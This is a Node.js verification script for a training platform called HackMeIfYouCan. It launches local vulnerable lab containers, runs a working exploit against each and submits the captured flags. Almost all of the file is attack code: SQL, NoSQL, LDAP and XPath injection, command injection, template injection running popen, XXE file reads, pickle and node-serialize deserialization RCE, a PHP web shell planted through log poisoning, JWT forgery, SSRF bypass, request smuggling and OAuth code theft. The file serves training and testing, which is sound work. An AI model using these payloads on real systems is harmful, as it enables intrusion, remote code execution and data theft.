// Automated Verification Script for HackMeIfYouCan
// Written in Pure JavaScript (Node.js) with zero third-party dependencies.
const crypto = require('crypto');

const DASHBOARD_URL = 'http://localhost:3000';

const LABS = [
  { id: "a01-idor", name: "IDOR", port: 30001 },
  { id: "a01-privesc", name: "Privilege Escalation", port: 30002 },
  { id: "a01-path-traversal", name: "Path Traversal", port: 30003 },
  { id: "a02-weak-crypto", name: "Weak Cryptography", port: 30004 },
  { id: "a03-sqli-union", name: "Union-Based SQLi", port: 30005 },
  { id: "a03-sqli-blind", name: "Blind SQLi", port: 30006 },
  { id: "a03-cmd-injection", name: "OS Command Injection", port: 30007 },
  { id: "a03-ssti", name: "SSTI", port: 30008 },
  { id: "a04-insecure-design", name: "Insecure Design", port: 30009 },
  { id: "a05-xxe", name: "XXE Injection", port: 30010 },
  { id: "a06-outdated-components", name: "Outdated Components (EJS RCE)", port: 30012 },
  { id: "a07-jwt-bypass", name: "JWT Algorithm Bypass", port: 30013 },
  { id: "a08-deserialization-python", name: "Python Deserialization", port: 30014 },
  { id: "a09-log-injection", name: "PHP Log Poisoning", port: 30015 },
  { id: "a10-ssrf", name: "Server-Side Request Forgery", port: 30016 },
  { id: "a01-cors", name: "CORS Misconfiguration", port: 30017 },
  { id: "a03-sqli-time", name: "Time-Blind SQLi", port: 30018 },
  { id: "a05-git", name: "Exposed Git Repository", port: 30019 },
  { id: "a07-oauth", name: "Broken OAuth 2.0 Flow", port: 30020 },
  { id: "a10-ssrf-bypass", name: "SSRF DNS & Blacklist Bypass", port: 30021 },
  { id: "a07-brute-force", name: "Username Enum & Brute Force", port: 30022 },
  { id: "a08-node-serialize", name: "Node-Serialize Deserialization RCE", port: 30023 },
  { id: "a09-log-xss", name: "Stored XSS via Log Poisoning", port: 30024 },
  { id: "a03-nosql", name: "NoSQL Injection", port: 30025 },
  { id: "a03-ldap", name: "LDAP Injection", port: 30026 },
  { id: "a03-second-order", name: "Second-Order SQLi", port: 30027 },
  { id: "a03-xpath", name: "XPath Injection", port: 30028 },
  { id: "a03-argument-injection", name: "Argument Injection", port: 30029 },
  { id: "a08-prototype-pollution", name: "Prototype Pollution", port: 30030 },
  { id: "a02-jwt-confusion", name: "JWT Key Confusion", port: 30031 },
  { id: "a06-request-smuggling", name: "HTTP Request Smuggling", port: 30032 },
  { id: "a04-race-condition", name: "Concurrency Race Condition", port: 30033 },
  { id: "cybercorp-portal", name: "OWASP Flagship - CyberCorp Audit Portal", port: 30040 }
];

// Helper: sleep
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

// Helper: base64url encode/decode
function base64urlEncode(obj) {
  return Buffer.from(JSON.stringify(obj), 'utf8')
    .toString('base64')
    .replace(/=/g, '')
    .replace(/\+/g, '-')
    .replace(/\//g, '_');
}

// Check if dashboard is online
async function checkDashboard() {
  try {
    const res = await fetch(`${DASHBOARD_URL}/api/labs`);
    return res.ok;
  } catch (e) {
    return false;
  }
}

// Start Lab Container
async function startLabContainer(id) {
  console.log(`[Dashboard] Sending start request for container: ${id}`);
  const res = await fetch(`${DASHBOARD_URL}/api/labs/${id}/start`, { method: 'POST' });
  const data = await res.json();
  if (!data.success) {
    throw new Error(`Failed to start container ${id}: ${data.error}`);
  }
  // Wait for service to warm up
  console.log(`[Dashboard] Warming up container ${id} for 4 seconds...`);
  await sleep(4000);
}

// Stop Lab Container
async function stopLabContainer(id) {
  console.log(`[Dashboard] Sending stop request for container: ${id}`);
  try {
    await fetch(`${DASHBOARD_URL}/api/labs/${id}/stop`, { method: 'POST' });
  } catch (e) {
    console.warn(`[Warning] Could not send stop command: ${e.message}`);
  }
}

// Submit Flag to Dashboard
async function submitFlagToDashboard(id, flag) {
  console.log(`[Dashboard] Submitting flag for ${id}: ${flag}`);
  try {
    const res = await fetch(`${DASHBOARD_URL}/api/labs/${id}/submit`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ flag })
    });
    const data = await res.json();
    return data.success;
  } catch (e) {
    console.error(`[Error] Failed to submit flag: ${e.message}`);
    return false;
  }
}

// Individual Exploit Modules
const EXPLOITS = {
  // A01 IDOR
  async "a01-idor"(port) {
    const url = `http://localhost:${port}/api/order?id=3`;
    const res = await fetch(url);
    const data = await res.json();
    return data.shippingAddress; // contains flag
  },

  // A01 Privilege Escalation
  async "a01-privesc"(port) {
    const header = { alg: "HS256", typ: "JWT" };
    const payload = { username: "guest", role: "admin" };
    const token = `${base64urlEncode(header)}.${base64urlEncode(payload)}.dummy_signature`;
    
    const res = await fetch(`http://localhost:${port}/api/admin/flag`, {
      headers: { Cookie: `auth_token=${token}` }
    });
    const data = await res.json();
    return data.flag;
  },

  // A01 Path Traversal
  async "a01-path-traversal"(port) {
    const res = await fetch(`http://localhost:${port}/api/view?file=../../flag.txt`);
    const text = await res.text();
    return text.trim();
  },

  // A02 Weak Cryptography
  async "a02-weak-crypto"(port) {
    // 1. Fetch source code to confirm key (mocked or audited)
    const key = 's3cr3t_k3y_128_b';
    
    // 2. Encrypt admin session cookie payload
    const sessionObj = { username: 'admin', role: 'admin', created: Date.now() };
    const cipher = crypto.createCipheriv('aes-128-ecb', Buffer.from(key, 'utf8'), null);
    let encrypted = cipher.update(JSON.stringify(sessionObj), 'utf8', 'hex');
    encrypted += cipher.final('hex');

    // 3. Query flag endpoint
    const res = await fetch(`http://localhost:${port}/api/admin/flag`, {
      headers: { Cookie: `session=${encrypted}` }
    });
    const data = await res.json();
    return data.flag;
  },

  // A03 Union SQLi
  async "a03-sqli-union"(port) {
    const payload = "' UNION SELECT username, password, '3' FROM users --";
    const res = await fetch(`http://localhost:${port}/api/search?q=${encodeURIComponent(payload)}`);
    const data = await res.json();
    
    // Find admin user credentials containing the FLAG
    const adminRecord = data.find(r => r.name === 'admin');
    return adminRecord ? adminRecord.description : null;
  },

  // A03 Blind SQLi
  async "a03-sqli-blind"(port) {
    console.log("   [Blind-SQLi] Automating character brute-force (this may take a few seconds)...");
    let flag = "FLAG{";
    const charset = "abcdefghijklmnopqrstuvwxyz_}";
    
    // Brute force loop for blind boolean injection
    for (let pos = 6; pos <= 40; pos++) {
      let found = false;
      for (const char of charset) {
        const payload = `visitor_id_x99' AND SUBSTR((SELECT password FROM users WHERE username='admin'),${pos},1)='${char}`;
        const res = await fetch(`http://localhost:${port}/`, {
          headers: { Cookie: `TrackingId=${encodeURIComponent(payload)}` }
        });
        const text = await res.text();
        
        if (text.includes("welcomeBack = true")) {
          flag += char;
          found = true;
          if (char === '}') break;
          break;
        }
      }
      if (!found) break; // End of characters
      if (flag.endsWith('}')) break;
    }
    return flag;
  },

  // A03 OS Command Injection
  async "a03-cmd-injection"(port) {
    const hostPayload = "127.0.0.1;cat$IFS*.txt";
    const res = await fetch(`http://localhost:${port}/api/ping?host=${encodeURIComponent(hostPayload)}`);
    const data = await res.json();
    const match = data.output.match(/FLAG\{[a-zA-Z0-9_-]+\}/);
    return match ? match[0] : null;
  },

  // A03 SSTI
  async "a03-ssti"(port) {
    const payload = "{{ lipsum.__globals__['os'].popen('cat flag.txt').read() }}";
    const res = await fetch(`http://localhost:${port}/api/render`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ template: payload })
    });
    const data = await res.json();
    return data.output ? data.output.trim() : null;
  },

  // A04 Insecure Design
  async "a04-insecure-design"(port) {
    // 1. Generate code for guest
    await fetch(`http://localhost:${port}/api/forgot-password`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: "guest" })
    });

    // 2. Fetch Mail Spool to retrieve code
    const mailRes = await fetch(`http://localhost:${port}/api/mail-log`);
    const mailLog = await mailRes.json();
    const guestMail = mailLog.filter(m => m.to === "guest@corporate.local").pop();
    const codeMatch = guestMail.body.match(/code\s(\d{4})/);
    const code = codeMatch ? codeMatch[1] : null;

    if (!code) throw new Error("Could not find reset code in simulated logs.");

    // 3. Verify Code
    const verifyRes = await fetch(`http://localhost:${port}/api/verify-code`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: "guest", code })
    });
    
    // Capture session cookies
    const cookieHeader = verifyRes.headers.get('set-cookie');
    const sessionIdCookie = cookieHeader ? cookieHeader.split(';')[0] : '';

    // 4. Overwrite password for 'admin' (Logic Flaw)
    const resetRes = await fetch(`http://localhost:${port}/api/reset-password`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', Cookie: sessionIdCookie },
      body: JSON.stringify({ username: "admin", newPassword: "pwnedPassword123!" })
    });

    // 5. Login as admin
    await fetch(`http://localhost:${port}/api/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', Cookie: sessionIdCookie },
      body: JSON.stringify({ username: "admin", password: "pwnedPassword123!" })
    });
    
    // 6. Query admin flag
    const flagRes = await fetch(`http://localhost:${port}/api/admin/flag`, {
      headers: { Cookie: sessionIdCookie }
    });
    const flagData = await flagRes.json();
    return flagData.flag;
  },

  // A05 XXE
  async "a05-xxe"(port) {
    const payload = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///app/flag.txt">
]>
<contact>
  <name>&xxe;</name>
  <email>test@corporate.local</email>
  <message>test</message>
</contact>`;

    const res = await fetch(`http://localhost:${port}/api/parse`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/xml' },
      body: payload
    });
    const data = await res.json();
    const match = data.output.match(/FLAG\{[a-zA-Z0-9_-]+\}/);
    return match ? match[0] : null;
  },

  // A06 Outdated Components
  async "a06-outdated-components"(port) {
    const payload = '?settings[view options][client]=true&settings[view options][escapeFunction]=1;global.process.mainModule.require(%27child_process%27).execSync(%27cat%20flag.txt%20%3E%20public/flag.txt%27);//';
    
    // Trigger prototype pollution options overwrite
    await fetch(`http://localhost:${port}/${payload}`);
    
    // Wait for file writing
    await sleep(1000);
    
    // Retrieve written file
    const res = await fetch(`http://localhost:${port}/flag.txt`);
    const text = await res.text();
    return text.trim();
  },

  // A07 JWT Bypass
  async "a07-jwt-bypass"(port) {
    const header = { alg: "none", typ: "JWT" };
    const payload = { username: "admin", role: "admin" };
    
    // Generate none alg token: header.payload. (note trailing dot)
    const token = `${base64urlEncode(header)}.${base64urlEncode(payload)}.`;
    
    const res = await fetch(`http://localhost:${port}/api/admin/flag`, {
      headers: { Cookie: `auth_token=${token}` }
    });
    const data = await res.json();
    return data.flag;
  },

  // A08 Python Deserialization
  async "a08-deserialization-python"(port) {
    // Pickle opcode sequence for: os.system("cp flag.txt static/flag.txt")
    const payloadText = "cos\nsystem\n(S'cp flag.txt static/flag.txt'\ntR.";
    const b64Payload = Buffer.from(payloadText, 'utf8').toString('base64');

    // Submit payload as session cookie to trigger RCE
    await fetch(`http://localhost:${port}/`, {
      headers: { Cookie: `session=${b64Payload}` }
    });

    // Wait for copy
    await sleep(1000);

    // Fetch flag from static folder
    const res = await fetch(`http://localhost:${port}/static/flag.txt`);
    const text = await res.text();
    return text.trim();
  },

  // A09 Log Poisoning LFI
  async "a09-log-injection"(port) {
    const phpShell = "<?php system(\$_GET['cmd']); ?>";
    
    // 1. Poison the log file by sending php code in User-Agent header
    await fetch(`http://localhost:${port}/`, {
      headers: { 'User-Agent': phpShell }
    });

    await sleep(1000);

    // 2. Trigger LFI on logs/access.log passing system command
    const res = await fetch(`http://localhost:${port}/index.php?file=logs/access.log&cmd=cat%20/app/flag.txt`);
    const text = await res.text();
    
    const match = text.match(/FLAG\{[a-zA-Z0-9_-]+\}/);
    return match ? match[0] : null;
  },

  // A10 SSRF
  async "a10-ssrf"(port) {
    const internalUrl = "http://127.0.0.1:3000/admin/secret";
    const res = await fetch(`http://localhost:${port}/api/fetch?url=${encodeURIComponent(internalUrl)}`);
    const data = await res.json();
    return data.flag;
  },

  // A01 CORS Misconfiguration
  async "a01-cors"(port) {
    const res = await fetch(`http://localhost:${port}/api/sensitive-profile`, {
      headers: { 'Origin': 'http://attacker.com' }
    });
    const data = await res.json();
    return data.flag;
  },

  // A03 Time-Blind SQLi
  async "a03-sqli-time"(port) {
    console.log("   [Time-Blind-SQLi] Automating character brute-force using timing queries (this may take a few seconds)...");
    let flag = "FLAG{";
    const charset = "abcdefghijklmnopqrstuvwxyz_}";
    
    // We start at position 6 (after "FLAG{")
    for (let pos = 6; pos <= 40; pos++) {
      let found = false;
      for (const char of charset) {
        // Query logic: Cartesian product is triggered if the condition matches.
        // If it matches, the query takes ~1.5 seconds. Otherwise, it takes 0 seconds.
        const payload = `visitor_id_x99' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='admin'),${pos},1)='${char}') THEN (SELECT COUNT(*) FROM delay_helper t1 CROSS JOIN delay_helper t2 CROSS JOIN delay_helper t3) ELSE 0 END) = 0 --`;
        
        const startTime = Date.now();
        await fetch(`http://localhost:${port}/`, {
          headers: { Cookie: `TrackingId=${encodeURIComponent(payload)}` }
        });
        const elapsed = Date.now() - startTime;
        
        if (elapsed > 1000) {
          flag += char;
          found = true;
          if (char === '}') break;
          break;
        }
      }
      if (!found) break;
      if (flag.endsWith('}')) break;
    }
    return flag;
  },

  // A05 Exposed Git
  async "a05-git"(port) {
    const zlib = require('zlib');
    
    // 1. Fetch /.git/logs/HEAD to grab the commit logs
    const logRes = await fetch(`http://localhost:${port}/.git/logs/HEAD`);
    const logText = await logRes.text();
    
    // 2. Find the commit containing "Add flag"
    const lines = logText.trim().split('\n');
    const firstCommitLine = lines.find(l => l.includes("Add flag")) || lines[0];
    if (!firstCommitLine) throw new Error("Could not find commit history.");
    
    const parts = firstCommitLine.split(' ');
    const commitHash = parts[1]; // target commit hash

    // 3. Fetch the commit object and extract tree hash
    const fetchZlibObject = async (sha1) => {
      const dir = sha1.substring(0, 2);
      const file = sha1.substring(2);
      const url = `http://localhost:${port}/.git/objects/${dir}/${file}`;
      const res = await fetch(url);
      const buffer = Buffer.from(await res.arrayBuffer());
      return zlib.inflateSync(buffer);
    };

    const commitObj = await fetchZlibObject(commitHash);
    const treeMatch = commitObj.toString().match(/tree ([0-9a-f]{40})/);
    if (!treeMatch) throw new Error("Could not extract tree from commit.");
    const treeHash = treeMatch[1];

    // 4. Fetch the tree object, grab the last 20 bytes representing blob SHA-1
    const treeObj = await fetchZlibObject(treeHash);
    const blobHashBuffer = treeObj.slice(-20);
    const blobHash = blobHashBuffer.toString('hex');

    // 5. Fetch the blob object containing the flag
    const blobObj = await fetchZlibObject(blobHash);
    const flag = blobObj.toString().split('\0')[1].trim();
    return flag;
  },

  // A07 OAuth Bypass
  async "a07-oauth"(port) {
    // Trigger login with a hijacked redirect_uri logging the code
    const attackerRedirect = `http://localhost:${port}/oauth/callback/../../api/attacker-receiver`;
    const authorizeUrl = `http://localhost:${port}/oauth/authorize?client_id=client123&redirect_uri=${encodeURIComponent(attackerRedirect)}&response_type=code`;
    
    // 1. Submit authorize URL to admin bot simulator
    await fetch(`http://localhost:${port}/api/trigger-login?url=${encodeURIComponent(authorizeUrl)}`);
    
    // Wait for bot execution
    await sleep(2000);

    // 2. Query attacker logs to extract hijacked authorization code
    const logsRes = await fetch(`http://localhost:${port}/api/attacker-receiver/logs`);
    const logsData = await logsRes.json();
    
    const lastLog = logsData.logs[logsData.logs.length - 1];
    if (!lastLog || !lastLog.query || !lastLog.query.code) {
      throw new Error("Could not capture leaked authorization code from attacker receiver.");
    }
    const stolenCode = lastLog.query.code;

    // 3. Complete login flow using hijacked authorization code to obtain admin session cookie
    const callbackRes = await fetch(`http://localhost:${port}/oauth/callback?code=${stolenCode}`, {
      redirect: 'manual'
    });
    
    const cookieHeader = callbackRes.headers.get('set-cookie');
    const clientSessionCookie = cookieHeader ? cookieHeader.split(';')[0] : '';

    // 4. Access administrative flag using our new admin session
    const flagRes = await fetch(`http://localhost:${port}/api/admin/flag`, {
      headers: { Cookie: clientSessionCookie }
    });
    const flagData = await flagRes.json();
    return flagData.flag;
  },

  // A10 SSRF Bypass
  async "a10-ssrf-bypass"(port) {
    // 2130706433 is the decimal representation of 127.0.0.1
    const bypassUrl = `http://2130706433:8000/flag`;
    const res = await fetch(`http://localhost:${port}/fetch?url=${encodeURIComponent(bypassUrl)}`);
    const data = await res.json();
    return data.flag;
  },

  // A07 Brute Force
  async "a07-brute-force"(port) {
    // 1. Enumerate usernames
    const usernames = ['operator', 'guest', 'admin', 'admin_sec_operator', 'security'];
    let validUser = '';
    
    for (const user of usernames) {
      const res = await fetch(`http://localhost:${port}/api/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: user, password: 'wrongpassword' })
      });
      const data = await res.json();
      
      // If error is "Incorrect password for user", then the username exists!
      if (data.error === "Incorrect password for user") {
        validUser = user;
        break;
      }
    }

    if (!validUser) throw new Error("Username enumeration failed.");

    // 2. Brute force password
    const passwords = ['123456', 'password', 'admin123', 'shadow123', 'security1'];
    let capturedFlag = '';
    
    for (const pass of passwords) {
      const res = await fetch(`http://localhost:${port}/api/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username: validUser, password: pass })
      });
      
      if (res.ok) {
        const data = await res.json();
        if (data.success) {
          capturedFlag = data.flag;
          break;
        }
      }
    }
    return capturedFlag;
  },

  // A08 Node-Serialize Deserialization RCE
  async "a08-node-serialize"(port) {
    // IIFE payload executing process execution: cp flag.txt public/flag.txt
    const payloadObj = {
      username: "admin",
      role: "admin",
      rce: "_$$ND_FUNC$$_function(){require('child_process').execSync('cp flag.txt public/flag.txt')}()"
    };
    
    const serialized = JSON.stringify(payloadObj);
    const b64 = Buffer.from(serialized, 'utf8').toString('base64');
    
    // Submit payload as session cookie to trigger RCE
    await fetch(`http://localhost:${port}/`, {
      headers: { Cookie: `session=${b64}` }
    });

    // Wait for copy
    await sleep(1500);

    // Fetch flag from public folder
    const res = await fetch(`http://localhost:${port}/flag.txt`);
    const text = await res.text();
    return text.trim();
  },

  // A09 Stored XSS via Log Poisoning
  async "a09-log-xss"(port) {
    const xssPayload = "<script>fetch('/api/admin/flag')</script>";
    
    // 1. Poison logs by sending failed login attempt with XSS payload in User-Agent
    await fetch(`http://localhost:${port}/api/login`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': xssPayload
      },
      body: 'username=attacker&password=wrong'
    });

    await sleep(1000);

    // 2. Trigger simulated administrator reviewing connection logs
    await fetch(`http://localhost:${port}/api/trigger-admin-view`);

    await sleep(1500);

    // 3. Retrieve captured flag from attacker logs receiver
    const res = await fetch(`http://localhost:${port}/api/attacker-receiver/logs`);
    const data = await res.json();
    return data.flags[data.flags.length - 1];
  },

  // A03 NoSQL Injection
  async "a03-nosql"(port) {
    const res = await fetch(`http://localhost:${port}/api/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: { "$ne": "non_existent_user" },
        password: { "$ne": "wrong_password" }
      })
    });
    const data = await res.json();
    return data.flag;
  },

  // A03 LDAP Injection
  async "a03-ldap"(port) {
    const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}';
    let knownFlag = 'FLAG{';
    
    while (!knownFlag.endsWith('}')) {
      let found = false;
      for (const char of charset) {
        const candidate = knownFlag + char;
        const query = `admin_sec_operator)(description=${candidate}*`;
        const res = await fetch(`http://localhost:${port}/api/search?query=${encodeURIComponent(query)}`);
        const data = await res.json();
        
        if (data.success && data.results && data.results.length > 0) {
          knownFlag = candidate;
          found = true;
          break;
        }
      }
      if (!found) {
        knownFlag += '}';
      }
    }
    return knownFlag;
  },

  // A03 Second-Order SQLi
  async "a03-second-order"(port) {
    const injectUser = "admin' --";
    await fetch(`http://localhost:${port}/api/register`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: injectUser,
        email: "attacker@corp.local",
        password: "password123"
      })
    });

    const logRes = await fetch(`http://localhost:${port}/api/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: injectUser,
        password: "password123"
      })
    });
    const logData = await logRes.json();
    const token = logData.token;

    const profRes = await fetch(`http://localhost:${port}/api/profile`, {
      headers: { 'Authorization': `Bearer ${token}` }
    });
    const profData = await profRes.json();
    return profData.profile.flag;
  },

  // A03 XPath Injection
  async "a03-xpath"(port) {
    const query = "1' or true() or '";
    const res = await fetch(`http://localhost:${port}/api/search?name=${encodeURIComponent(query)}`);
    const data = await res.json();
    
    if (data.success && data.results) {
      const flagNode = data.results.find(r => r.name === 'Platform Secret Flag Node');
      return flagNode ? flagNode.description : null;
    }
    return null;
  },

  // A03 Argument Injection
  async "a03-argument-injection"(port) {
    await fetch(`http://localhost:${port}/api/fetch`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        url: ["--output", "public/leak.txt", `http://localhost:${port}/flag`]
      })
    });

    await sleep(1500);

    const res = await fetch(`http://localhost:${port}/leak.txt`);
    const flag = await res.text();
    return flag.trim();
  },

  // A08 Prototype Pollution
  async "a08-prototype-pollution"(port) {
    // 1. Pollute Object.prototype using dynamic merge vulnerable handler
    await fetch(`http://localhost:${port}/api/config`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        config: {
          __proto__: {
            isAdmin: true
          }
        }
      })
    });

    // 2. Query admin endpoint to retrieve flag
    const res = await fetch(`http://localhost:${port}/api/admin/stats`);
    const data = await res.json();
    return data.flag;
  },

  // A02 JWT Key Confusion
  async "a02-jwt-confusion"(port) {
    // 1. Fetch public key PEM
    const pkRes = await fetch(`http://localhost:${port}/public-key.pem`);
    const publicKeyPem = await pkRes.text();

    // 2. Sign token with HS256 using the PEM public key as key confusion secret
    const header = { alg: "HS256", typ: "JWT" };
    const payload = { username: "admin", role: "admin" };
    const unsignedToken = `${base64urlEncode(header)}.${base64urlEncode(payload)}`;
    const signature = crypto.createHmac('sha256', publicKeyPem)
      .update(unsignedToken)
      .digest('base64')
      .replace(/=/g, '')
      .replace(/\+/g, '-')
      .replace(/\//g, '_');

    const token = `${unsignedToken}.${signature}`;

    // 3. Request flag
    const res = await fetch(`http://localhost:${port}/api/admin/flag`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token })
    });
    const data = await res.json();
    return data.flag;
  },

  // A06 HTTP Request Smuggling
  async "a06-request-smuggling"(port) {
    return new Promise((resolve, reject) => {
      const net = require('net');
      const client = net.connect(port, 'localhost', () => {
        // Construct CL.TE payload
        // Content-Length has length of the entire body including smuggled payload
        // Transfer-Encoding is processed as chunked: back-end sees 0 (end of first request)
        // and leaves the rest in the pipeline buffer!
        const payload = 
          "POST / HTTP/1.1\r\n" +
          `Host: localhost:${port}\r\n` +
          "Content-Length: 90\r\n" +
          "Transfer-Encoding: chunked\r\n" +
          "\r\n" +
          "0\r\n" +
          "\r\n" +
          "POST /api/capture HTTP/1.1\r\n" +
          "Host: localhost\r\n" +
          "Content-Length: 5\r\n" +
          "\r\n" +
          "x=123";

        client.write(payload);
      });

      let responseData = '';
      client.on('data', (data) => {
        responseData += data.toString();
        client.end();
      });

      client.on('end', async () => {
        try {
          // Sleep a bit and check flag queue
          await sleep(1000);
          const flagRes = await fetch(`http://localhost:${port}/api/flag`);
          const flagData = await flagRes.json();
          resolve(flagData.flag);
        } catch (e) {
          reject(e);
        }
      });

      client.on('error', (err) => reject(err));
    });
  },

  // A04 Concurrency Race Condition
  async "a04-race-condition"(port) {
    // 1. Send parallel requests using Promise.all to bypass TOCTOU lock
    const requests = Array.from({ length: 8 }, () => {
      return fetch(`http://localhost:${port}/api/apply-coupon`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ coupon: 'FREE50' })
      });
    });

    await Promise.all(requests);

    // 2. Buy flag
    const res = await fetch(`http://localhost:${port}/api/buy-flag`, {
      method: 'POST'
    });
    const data = await res.json();
    return data.flag;
  },

  // CyberCorp Unified Flagship Scenario
  async "cybercorp-portal"(port) {
    console.log("   [Flagship] Phase 1: Query announcements to leak resource IDs...");
    const annRes = await fetch(`http://localhost:${port}/api/announcements`);
    const annData = await annRes.json();
    const notice = annData.announcements.find(a => a.content.includes("doc_"));
    const docId = notice ? notice.content.match(/doc_[a-zA-Z0-9_]+/)[0] : "doc_admin_f8c12a84";
    
    console.log(`   [Flagship] Leaked reference document: ${docId}`);

    console.log("   [Flagship] Phase 2: Exploiting cross-tenant IDOR/BOLA...");
    // Retrieve admin document contents using BOLA on tenant A partition
    const docRes = await fetch(`http://localhost:${port}/api/tenants/tenant_a_19df94c2/documents/${docId}`);
    const docData = await docRes.json();
    console.log(`   [Flagship] IDOR Success. Document content leaked: ${docData.document.content.split('\n')[0]}`);

    console.log("   [Flagship] Phase 3: Retrieving dynamic SSO Public Key certificate...");
    const pkRes = await fetch(`http://localhost:${port}/public-key.pem`);
    const publicKeyPem = await pkRes.text();

    console.log("   [Flagship] Phase 4: Forging JWT Admin token via Algorithm Confusion...");
    const header = { alg: "HS256", typ: "JWT" };
    const payload = { username: "executive_admin", role: "admin", tenantId: "tenant_a_19df94c2" };
    const unsignedToken = `${base64urlEncode(header)}.${base64urlEncode(payload)}`;
    const normalizedKey = publicKeyPem.toString().replace(/\r\n/g, '\n').trim();
    const signature = crypto.createHmac('sha256', normalizedKey)
      .update(unsignedToken)
      .digest('base64')
      .replace(/=/g, '')
      .replace(/\+/g, '-')
      .replace(/\//g, '_');

    const adminToken = `${unsignedToken}.${signature}`;

    console.log("   [Flagship] Phase 5: Triggering Server-Side Prototype Pollution...");
    // Pollute EJS options via deep merge using JSON.parse to enforce __proto__ as an enumerable property key
    await fetch(`http://localhost:${port}/api/settings`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Cookie': `auth_token=${adminToken}`
      },
      body: JSON.stringify({
        config: JSON.parse('{"__proto__": {"client": true, "escapeFunction": "cp flag.txt public/flag.txt"}}')
      })
    });

    console.log("   [Flagship] Phase 6: Invoking administrative EJS renderer to execute RCE...");
    await fetch(`http://localhost:${port}/admin/render`, {
      headers: { 'Cookie': `auth_token=${adminToken}` }
    });

    await sleep(2000);

    console.log("   [Flagship] Phase 7: Fetching leaked system flag...");
    const flagRes = await fetch(`http://localhost:${port}/flag.txt`);
    const flagText = await flagRes.text();
    return flagText.trim();
  }
};

// Main verification runner
async function run() {
  console.log("====================================================");
  console.log("      HACKMEIFYOUCAN EXPLOIT VERIFIER FRAMEWORK     ");
  console.log("====================================================\n");

  const dashboardOnline = await checkDashboard();
  if (dashboardOnline) {
    console.log(`[+] Dashboard online at ${DASHBOARD_URL}. Enabling lifecycle manager.\n`);
  } else {
    console.log(`[!] Dashboard offline at ${DASHBOARD_URL}. Running passive checks on ports.\n`);
  }

  const results = [];

  for (const lab of LABS) {
    console.log(`[*] Triaging lab: ${lab.name} (${lab.id})`);
    let startedHere = false;
    
    try {
      // 1. Start container if dashboard is online and container is stopped
      if (dashboardOnline) {
        await startLabContainer(lab.id);
        startedHere = true;
      }

      // 2. Run corresponding exploit
      const exploitFn = EXPLOITS[lab.id];
      if (exploitFn) {
        console.log(`   [Exploit] Executing exploit script on port ${lab.port}...`);
        const flag = await exploitFn(lab.port);
        
        if (flag && flag.startsWith("FLAG{")) {
          console.log(`   [Success] Flag captured: ${flag}`);
          
          // 3. Submit back to dashboard to sync progress
          let submitted = false;
          if (dashboardOnline) {
            submitted = await submitFlagToDashboard(lab.id, flag);
          }
          
          results.push({ name: lab.name, status: "SUCCESS", flag, synced: submitted ? "YES" : "N/A" });
        } else {
          console.log(`   [Failure] Exploit finished but returned invalid flag format: ${flag}`);
          results.push({ name: lab.name, status: "FAILED (Invalid Flag)", flag: "-", synced: "NO" });
        }
      } else {
        console.log(`   [Skip] Exploit script placeholder. Skipping.`);
        results.push({ name: lab.name, status: "SKIPPED", flag: "-", synced: "NO" });
      }

    } catch (e) {
      console.error(`   [Error] Lab verification failed with exception:`, e.message);
      results.push({ name: lab.name, status: `ERROR (${e.message})`, flag: "-", synced: "NO" });
    } finally {
      // 4. Stop container if we started it
      if (dashboardOnline && startedHere) {
        await stopLabContainer(lab.id);
      }
      console.log("");
    }
  }

  // Print summary report
  console.log("==========================================================================================");
  console.log("                               VERIFICATION SUMMARY REPORT                                ");
  console.log("==========================================================================================");
  console.table(results);
  console.log("==========================================================================================");
}

run();
